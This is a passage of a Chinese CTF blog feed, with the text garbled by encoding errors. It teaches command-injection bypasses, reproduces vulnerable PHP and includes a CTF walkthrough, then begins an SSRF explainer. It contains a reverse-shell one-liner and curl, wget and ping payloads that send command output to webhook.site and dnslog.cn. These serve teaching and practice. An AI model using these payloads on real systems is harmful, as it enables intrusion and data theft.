class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="windowsç³»ç»Ÿçš„cmdexeå’Œlinuxç³»ç»Ÿçš„bashç¨‹åºåœ¨è§£æå‘½ä»¤æ—¶å¼‚åŒç‚¹"><a class="markdownIt-Anchor" href="#windowsç³»ç»Ÿçš„cmdexeå’Œlinuxç³»ç»Ÿçš„bashç¨‹åºåœ¨è§£æå‘½ä»¤æ—¶å¼‚åŒç‚¹"></a> windowsç³»ç»Ÿçš„cmd.exeå’ŒLinuxç³»ç»Ÿçš„bashç¨‹åºåœ¨è§£æå‘½ä»¤æ—¶å¼‚åŒç‚¹</h4><h5 id="1è½¬ä¹‰å­—ç¬¦"><a class="markdownIt-Anchor" href="#1è½¬ä¹‰å­—ç¬¦"></a> 1.è½¬ä¹‰å­—ç¬¦</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Windowsçš„è½¬ä¹‰å­—ç¬¦ä¸ºâ€œ^â€<br>Linuxçš„è½¬ä¹‰å­—ç¬¦ä¸ºâ€œ<span class="hljs-string">\â€</span><br></code></pre></td></tr></table></figure><h5 id="2å¤šæ¡å‘½ä»¤æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#2å¤šæ¡å‘½ä»¤æ‰§è¡Œ"></a> 2ï¼å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h5><p>åœ¨å‘½ä»¤æ³¨å…¥ä¸­é€šå¸¸éœ€è¦æ³¨å…¥å¤šæ¡å‘½ä»¤æ¥æ‰©å¤§å±å®³</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Windowsä¸‹<br><span class="hljs-meta">&amp;&amp;ï¼šå‰é¢è¯­å¥ä¸ºçœŸæ—¶ï¼Œæ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</span><br><span class="hljs-meta">&amp;ï¼šå‰é¢è¯­å¥ä¸ºå‡æ—¶ç›´æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤</span><br><span class="hljs-string">||ï¼šå‰é¢ä¸ºå‡æ‰§è¡Œåé¢çš„å‘½ä»¤</span><br><span class="hljs-string">|ï¼šç›´æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤</span><br>urlä¸­%<span class="hljs-number">0</span>aå®ç°æ¢è¡Œä¹Ÿå¯ä»¥å¤šè¯­å¥æ‰§è¡Œ<br><br>Linuxä¸‹ï¼š<br>;:å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„<br><span class="hljs-meta">&amp;&amp;ï¼šå‰é¢ä¸ºçœŸæ‰æ‰§è¡Œåé¢</span><br><span class="hljs-string">||ï¼šå‰é¢ä¸ºå‡æ‰æ‰§è¡Œåé¢</span><br><span class="hljs-string">|ï¼šç›´æ¥æ‰§è¡Œåé¢</span><br>$(),``,%<span class="hljs-number">0</span>a,%<span class="hljs-number">0</span>d<br></code></pre></td></tr></table></figure><h5 id="3æ³¨é‡Šç¬¦å·"><a class="markdownIt-Anchor" href="#3æ³¨é‡Šç¬¦å·"></a> 3ï¼æ³¨é‡Šç¬¦å·</h5><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">windowsçš„æ³¨é‡Šç¬¦å·ä¸ºâ€œ::</span>â€<br>Linuxçš„æ³¨é‡Šç¬¦å·ä¸ºâ€œï¼ƒâ€<br></code></pre></td></tr></table></figure><h4 id="å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡å’ŒæŠ€å·§"><a class="markdownIt-Anchor" href="#å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡å’ŒæŠ€å·§"></a> å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡å’ŒæŠ€å·§</h4><h5 id="1è¿‡æ»¤ç©ºæ ¼"><a class="markdownIt-Anchor" href="#1è¿‡æ»¤ç©ºæ ¼"></a> 1.è¿‡æ»¤ç©ºæ ¼</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;CMD:&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&gt;?<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-number">1</span>)fuzzä¸€ä¸‹%<span class="hljs-number">00</span>ï½%ffä¹‹é—´çš„å­—ç¬¦ä¸²ï¼Œæœ‰ä¸€ä¸‹å­—ç¬¦å¯ä»¥ç»•è¿‡ç©ºæ ¼çš„é™åˆ¶<br>(<span class="hljs-number">2</span>)é€šè¿‡å­—ç¬¦ä¸²æˆªå–çš„æ–¹å¼è·å–ç©ºæ ¼<br>windowsä¸‹ï¼š~<br>        å¦‚ï¼š%ProgramFiles:~<span class="hljs-number">10</span>,<span class="hljs-number">1</span>%<br>        <span class="hljs-comment">#%ProgramFiles%æ˜¯ç¯å¢ƒå˜é‡ï¼šC:\Program Filesï¼Œ~10,1è¡¨ç¤ºåœ¨ç¬¬åä¸ªå¼€å§‹å–ä¸€ä¸ªåˆšå¥½æ˜¯ç©ºæ ¼</span><br>linuxä¸‹ï¼š<br>        <span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<br>        <span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt<br>        <span class="hljs-built_in">cat</span>&lt;flag.txt<br>        <span class="hljs-built_in">cat</span>&lt;&gt;flag.txt<br>        &#123;<span class="hljs-built_in">cat</span>,flag.txt &#125;<br><br></code></pre></td></tr></table></figure><h5 id="2é»‘åå•å…³é”®å­—"><a class="markdownIt-Anchor" href="#2é»‘åå•å…³é”®å­—"></a> 2.é»‘åå•å…³é”®å­—</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-number">1</span>)åˆ©ç”¨å˜é‡æ‹¼æ¥<br>linuxä¸‹ï¼ša=c;b=at;c=he;d=llo;$a<span class="hljs-variable">$b</span> $&#123;c&#125;$&#123;d&#125;   <span class="hljs-comment">#cat hello</span><br>(<span class="hljs-number">2</span>)ä½¿ç”¨é€šé…ç¬¦<br>â€œï¼Ÿâ€ä»£è¡¨ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œâ€œ*â€åˆ™ä»£è¡¨ä»»æ„ä¸ªå­—ç¬¦ä¸²<br>windowsä¸‹ï¼štype fla*<br>linuxä¸‹:cat fl*<br>(<span class="hljs-number">3</span>)å•å¼•å·æˆ–åŒå¼•å·ç»•è¿‡ï¼šlinuxä¸‹ï¼šca<span class="hljs-string">&#x27;&#x27;</span>t flag æˆ– ca<span class="hljs-string">&quot;&quot;</span>t <span class="hljs-title function_ invoke__">flag</span><br>(<span class="hljs-number">4</span>)åæ–œæ†ç»•è¿‡ï¼šlinuxä¸‹ï¼šca\t f\<span class="hljs-title function_ invoke__">lag</span><br>(<span class="hljs-number">5</span>)å€Ÿç”¨å·²æœ‰å­—ç¬¦ä¸²<br>åˆ©ç”¨<span class="hljs-title function_ invoke__">substr</span>()å‡½æ•°æˆªå–<br>linuxä¸‹ï¼š<br>        <span class="hljs-comment">#lemon.php</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>        <span class="hljs-meta">?&gt;</span><br>        substr $(awk NR==<span class="hljs-number">1</span> lemon.php) <span class="hljs-number">1</span> <span class="hljs-number">1</span>   <span class="hljs-comment">#&lt;</span><br>        substr $(awk NR==<span class="hljs-number">1</span> lemon.php) <span class="hljs-number">2</span> <span class="hljs-number">1</span>   <span class="hljs-comment">#?</span><br>(<span class="hljs-number">6</span>)ç¼–ç ç»•è¿‡ï¼šbase64ç¼–ç ï¼Œhexç¼–ç ï¼ˆlinuxï¼‰<br></code></pre></td></tr></table></figure><h4 id="æ— å›æ˜¾rce"><a class="markdownIt-Anchor" href="#æ— å›æ˜¾rce"></a> æ— å›æ˜¾RCE</h4><p>æ— å›æ˜¾RCEè¯´æ˜å‘½ä»¤èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œç»“æœä¸èƒ½å›æ˜¾</p><p>å¯ä»¥åˆ©ç”¨sleepå‡½æ•°æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping&#x27;</span>.<span class="hljs-variable">$target</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>|sleep <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h5 id="åå¼¹shell"><a class="markdownIt-Anchor" href="#åå¼¹shell"></a> åå¼¹shell</h5><p>åå¼¹shelléœ€è¦è‡ªå·±æœ‰ä¸€å°æœåŠ¡å™¨,è¿™é‡Œåˆ©ç”¨è™šæ‹Ÿæœºå’ŒçœŸå®æœºåšå®éªŒ</p><p>å®éªŒç¯å¢ƒï¼š</p><p>è™šæ‹Ÿæœºï¼škali-linux-2021.2192.168.224.128</p><p>çœŸå®æœºï¼šwindows10192.168.1.22</p><p>ç¬¬ä¸€æ­¥ï¼šè™šæ‹Ÿæœºå¼€å¯ç›‘å¬ç«¯å£<code>nc -lvp 7777</code></p><p>ç¬¬äºŒæ­¥ï¼šçœŸå®æœºç”¨git bash è¿è¡Œ<code>bash -i &gt;&amp; /dev/tcp/192.168.224.128/7777 0&gt;&amp;1</code></p><p>è§£é‡Šè¿™ä¸ªè¯­å¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -iä»£è¡¨åœ¨æœ¬åœ°æ‰“å¼€ä¸€ä¸ªbash<br><span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œ&gt;&amp;åé¢è·Ÿä¸Š/</span>dev<span class="hljs-regexp">/tcp/i</span>p/portè¿™ä¸ªæ–‡ä»¶ä»£è¡¨å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¼ é€’åˆ°è¿œç¨‹ä¸Šï¼Œå¦‚æœè¿œç¨‹å¼€å¯äº†å¯¹åº”çš„ç«¯å£å»ç›‘å¬ï¼Œå°±ä¼šæ¥æ”¶åˆ°è¿™ä¸ªbashçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡º<br><span class="hljs-number">0</span> - stdin ä»£è¡¨æ ‡å‡†è¾“å…¥,ä½¿ç”¨&lt;æˆ–&lt;&lt;<br><span class="hljs-number">1</span> - stdout ä»£è¡¨æ ‡å‡†è¾“å‡º,ä½¿ç”¨&gt;æˆ–&gt;&gt;<br><span class="hljs-number">2</span> - stderr ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡º,ä½¿ç”¨<span class="hljs-number">2</span>&gt;æˆ–<span class="hljs-number">2</span>&gt;&gt;<br>å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶ã€‚<br>å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œè¡¨ç¤ºå°†å‰é¢çš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘è‡³åé¢çš„æ–‡ä»¶æè¿°ç¬¦<br></code></pre></td></tr></table></figure><p>ä¹‹åè™šæ‹Ÿæœºè¿æ¥åˆ°çœŸå®æœºè¿›è¡Œrce</p><img src="/2023/01/05/RCE/2.jpg" class=""><p>ä¸‹é¢ç»™å‡ºäº†æ•´ä¸ªè¿‡ç¨‹çš„æ•°æ®æµå‘ï¼Œé¦–å…ˆæ˜¯æœ¬åœ°çš„è¾“å…¥è¾“å‡ºæµå‘</p><img src="/2023/01/05/RCE/3.png" class=""><p>æ‰§è¡Œ<code>bash -i &gt;&amp; /dev/tcp/ip/port</code>å</p><img src="/2023/01/05/RCE/4.png" class=""><p>æ‰§è¡Œ<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>æˆ–è€…<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2</code>å:</p><img src="/2023/01/05/RCE/5.png" class=""><h5 id="dnså¸¦å¤–"><a class="markdownIt-Anchor" href="#dnså¸¦å¤–"></a> DNSå¸¦å¤–</h5><p>åœ¨<a href="http://www.dnslog.cn/">DNSLog</a>æ³¨å†Œä¸€ä¸ªä¸´æ—¶çš„DNS</p><p>payload:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `whoami`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br>ping `cat flag`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br></code></pre></td></tr></table></figure><p>æ³¨ï¼šåªæœ‰å›æ˜¾æ˜¯ä¸€ä¸ªæ•°æ®çš„æ‰èƒ½æˆåŠŸ</p><h5 id="httpå¸¦å¤–"><a class="markdownIt-Anchor" href="#httpå¸¦å¤–"></a> httpå¸¦å¤–</h5><p>åœ¨<a href="https://webhook.site/">webhook</a>ç”Ÿæˆä¸€ä¸ªä¸´æ—¶ç½‘ç«™æ¥æ¥å—è¯·æ±‚æŸ¥çœ‹å›æ˜¾</p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">(<span class="hljs-number">1</span>)<br>curl https:<span class="hljs-regexp">//</span>webhook.site<span class="hljs-regexp">/318355c4-be7a-4a93-8241-53a6028f7070/</span>`whoami`<br>curl https:<span class="hljs-regexp">//</span>webhook.site<span class="hljs-regexp">/318355c4-be7a-4a93-8241-53a6028f7070/</span>`cat flag`<br><br>(<span class="hljs-number">2</span>)<br>wget https:<span class="hljs-regexp">//</span>webhook.site<span class="hljs-regexp">/318355c4-be7a-4a93-8241-53a6028f7070/</span>`whoami`<br>wget https:<span class="hljs-regexp">//</span>webhook.site<span class="hljs-regexp">/318355c4-be7a-4a93-8241-53a6028f7070/</span>`cat flag`<br></code></pre></td></tr></table></figure><p>æ³¨ï¼šåªæœ‰å›æ˜¾æ˜¯ä¸€ä¸ªæ•°æ®çš„æ‰èƒ½æˆåŠŸ</p><h5 id="tee-å†™å…¥æ–‡ä»¶"><a class="markdownIt-Anchor" href="#tee-å†™å…¥æ–‡ä»¶"></a> tee å†™å…¥æ–‡ä»¶</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /|<span class="hljs-built_in">tee</span> 1.txtè®¿é—®1.txt<br><span class="hljs-built_in">cat</span> /flag|<span class="hljs-built_in">tee</span> 2.txt è®¿é—®2.txt<br></code></pre></td></tr></table></figure><h3 id="gxyctf-2019ping-ping-ping"><a class="markdownIt-Anchor" href="#gxyctf-2019ping-ping-ping"></a> [GXYCTF 2019]Ping Ping Ping</h3><img src="/2023/01/05/RCE/1.png" class=""><p>ä¸€ä¸ªpingçš„æ¥å£ï¼Œä¹Ÿå°±æ˜¯ç»“åˆpingè¿›è¡Œrce</p><p>å°è¯•<code>127.0.0.1|ls</code></p><p>å¾—åˆ°</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php<br><span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><p>æµ‹è¯•çŸ¥é“è¿‡æ»¤äº†ç©ºæ ¼ï¼Œflagç­‰</p><p>å°è¯•cat index.phpï¼Œå³æ„é€ <code>127.0.0.1|cat$IFS$9index.php</code></p><p>å¾—åˆ°index.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$match</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$ip</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å®¡è®¡ä¸€ä¸‹ä»£ç å‘ç°å„ç§ç‰¹æ®Šå­—ç¬¦éƒ½è¢«è¿‡æ»¤flagå››ä¸ªå­—æ¯è¿˜ä¸èƒ½é¡ºåºå‡ºç°ï¼Œé‚£å°±è€ƒè™‘å˜é‡æ‹¼æ¥</p><p><code>127.0.0.1;a=ag.php;b=fl;cat$IFS$9$b$a</code>,å€¼å¾—æ³¨æ„çš„æ˜¯éƒ½è¦ç”¨<code>;</code>åˆ†å¼€ï¼Œä¸èƒ½åˆç”¨|åˆç”¨;</p><p>å†æŸ¥çœ‹é¡µé¢æºç å°±å¯ä»¥å¾—åˆ°flag<code>NSSCTF&#123;5775c26b-4632-4342-9e6b-347d2d00fa55&#125;</code></p><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em>ã€Šä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ (Nu1Læˆ˜é˜Ÿ ç¼–è‘—) ã€‹</em></p><p><em><a href="https://ctf-wiki.org/web/php/php/#_8">https://ctf-wiki.org/web/php/php/#_8</a></em></p><p><em><a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/01/04/ssrf/"/>
    <url>/2023/01/04/ssrf/</url>
    
    <content type="html"><![CDATA[<h3 id="ssrfåŸºç¡€"><a class="markdownIt-Anchor" href="#ssrfåŸºç¡€"></a> SSRFåŸºç¡€</h3><p>SSRFï¼ŒServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªæ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p><p>æ¼æ´å½¢æˆçš„åŸå› å¤§å¤šæ˜¯å› ä¸ºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€ä½œè¿‡æ»¤å’Œé™åˆ¶ã€‚</p><h4 id="æ”»å‡»è€…å¯ä»¥åˆ©ç”¨-ssrf-å®ç°çš„æ”»å‡»ä¸»è¦æœ‰-5-ç§"><a class="markdownIt-Anchor" href="#æ”»å‡»è€…å¯ä»¥åˆ©ç”¨-ssrf-å®ç°çš„æ”»å‡»ä¸»è¦æœ‰-5-ç§"></a> æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SSRF å®ç°çš„æ”»å‡»ä¸»è¦æœ‰ 5 ç§ï¼š</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ banner ä¿¡æ¯<br>2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰<br>3.å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°<br>4.æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ <span class="hljs-built_in">GET</span> å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚ Struts2ï¼Œsqli ç­‰ï¼‰<br>5.åˆ©ç”¨ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰<br></code></pre></td></tr></table></figure><h4 id="ssrf-æ¼æ´å‡ºç°çš„åœºæ™¯"><a class="markdownIt-Anchor" href="#ssrf-æ¼æ´å‡ºç°çš„åœºæ™¯"></a> SSRF æ¼æ´å‡ºç°çš„åœºæ™¯</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span>èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹ï¼Œå°±å¯èƒ½å­˜åœ¨ <span class="hljs-variable">SSRF</span> æ¼æ´<br><span class="hljs-number">2.</span>ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆ<span class="hljs-variable">Upload</span> <span class="hljs-variable">from</span> <span class="hljs-built_in">URL</span>ï¼Œ<span class="hljs-built_in">Import</span> <span class="hljs-operator">&amp;</span> <span class="hljs-built_in">Export</span> <span class="hljs-variable">RSS</span> <span class="hljs-variable">Feed</span>ï¼‰<br><span class="hljs-number">3.</span>æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼ˆ<span class="hljs-variable">Oracle</span>ã€<span class="hljs-variable">MongoDB</span>ã€<span class="hljs-variable">MSSQL</span>ã€<span class="hljs-variable">Postgres</span>ã€<span class="hljs-variable">CouchDB</span>ï¼‰<br><span class="hljs-number">4.</span><span class="hljs-variable">Webmail</span> æ”¶å–å…¶ä»–é‚®ç®±é‚®ä»¶ï¼ˆ<span class="hljs-variable">POP3</span>ã€<span class="hljs-variable">IMAP</span>ã€<span class="hljs-variable">SMTP</span>ï¼‰<br><span class="hljs-number">5.</span>æ–‡ä»¶å¤„ç†ã€ç¼–ç å¤„ç†ã€å±æ€§ä¿¡æ¯å¤„ç†ï¼ˆ<span class="hljs-variable">ffmpeg</span>ã€<span class="hljs-variable">ImageMagic</span>ã€<span class="hljs-variable">DOCX</span>ã€<span class="hljs-built_in">PDF</span>ã€<span class="hljs-variable">XML</span>ï¼‰<br></code></pre></td></tr></table></figure><h4 id="å¸¸ç”¨çš„åç«¯å®ç°"><a class="markdownIt-Anchor" href="#å¸¸ç”¨çš„åç«¯å®ç°"></a> å¸¸ç”¨çš„åç«¯å®ç°</h4><p>1.file_get_contents</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 